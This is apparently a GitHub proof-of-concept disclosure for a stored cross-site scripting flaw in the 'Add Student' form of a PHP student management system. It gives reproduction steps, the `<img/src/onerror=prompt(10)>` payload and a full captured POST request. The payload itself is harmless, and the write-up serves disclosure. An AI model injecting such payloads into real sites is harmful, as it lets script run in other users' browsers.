# sms-Add_Student-Stored_XSS-POC
Description => Stored_XSS at `Add Student`
# Step to Reproduct
* Login to admin -> `Students` -> `Add Student` -> input payload `<img/src/onerror=prompt(10)>` at `Enter Name`
# Exploit
![image](https://user-images.githubusercontent.com/79050415/158715096-7fe6c540-b7cb-4293-b60f-f0e16b6d445c.png)
* Input payload at `Enter Name` -> clicked `Add Students` -> access `All Student` -> The XSS will trigger
![image](https://user-images.githubusercontent.com/79050415/158715379-451cbe16-2f5b-4772-bf1a-e6e0c3d05aa4.png)
* Log out admin and typed `roll number` -> The XSS will trigger
* ![image](https://user-images.githubusercontent.com/79050415/158715734-d68d1fbf-ebef-4f7e-b62e-038c45056d1a.png)
![image](https://user-images.githubusercontent.com/79050415/158715881-a348606b-94fe-4a2a-abf9-9fa5c719f14e.png)
# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/158716291-52718f20-b719-44ef-a9ca-21b00e82b2de.png)
* When inserting into the database, the input is not filtered out bad characters
# POC 
* `Injection Point` 
```c
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="name"

<img/src/onerror=prompt(10)>
```
* `Request`
```c
POST /sms/admin/addstudent.php HTTP/1.1
Host: localhost:8080
Content-Length: 992
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAvKt9LM2RnnkuA0K
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/sms/admin/addstudent.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=p440fhd7svqid5f063i3epg29k
Connection: close

------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="image"; filename="car.png"
Content-Type: application/octet-stream


------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="rollno"

1234567
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="name"

<img/src/onerror=prompt(10)>
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="contact"

123456
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="standerd"

1
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="city"

Newyork
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="email"

haha@gmail.com
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="gender"

male
------WebKitFormBoundaryAvKt9LM2RnnkuA0K
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryAvKt9LM2RnnkuA0K--

```
`POC VIDEO` https://drive.google.com/file/d/1PLRmIi7EBMAXkLMUhUy09PVph1CW6otF/view?usp=sharing


